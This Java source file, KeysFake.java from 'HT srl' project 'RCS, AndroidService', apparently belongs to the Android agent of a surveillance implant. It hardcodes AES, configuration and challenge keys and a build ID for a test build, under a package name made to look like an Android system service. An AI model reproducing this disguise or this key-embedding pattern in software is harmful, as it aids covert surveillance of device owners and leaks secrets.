/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : KeysFake.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.crypto;

import com.android.service.util.Utils;

/**
 * The Class KeysFake.
 */
public class KeysFake extends Keys {
	
	 // RCS 816 "Test8" su castore
	 byte[] AesKey = Utils.hexStringToByteArray("43ddcdb58f42216465e0bad6a0e9214f659ce4ece5b146a67713bb02f3c8399c",0,32);
	 byte[] ConfKey = Utils.hexStringToByteArray("49d1e153429bdc361a0aa842625c0aeebca6aa7cf885d957e45008360ed9937d",0,32);
	 byte[] ChallengeKey = Utils.hexStringToByteArray("572ebc94391281ccf53a851330bb0d99b16ba1908523056145a7e58e6f42cc21",0,32);
	 String BuildId = "RCS_0000000816";

	public KeysFake() {
		super(false);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getAesKey()
	 */
	@Override
	public byte[] getAesKey() {
		return AesKey;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getChallengeKey()
	 */
	@Override
	public byte[] getChallengeKey() {
		return ChallengeKey;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getConfKey()
	 */
	@Override
	public byte[] getConfKey() {
		return ConfKey;
	}
	
	/*
	 * public byte[] getInstanceId() { return g_InstanceId; }
	 */

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getBuildId()
	 */
	@Override
	public byte[] getBuildId() {
		return BuildId.getBytes();
	}
}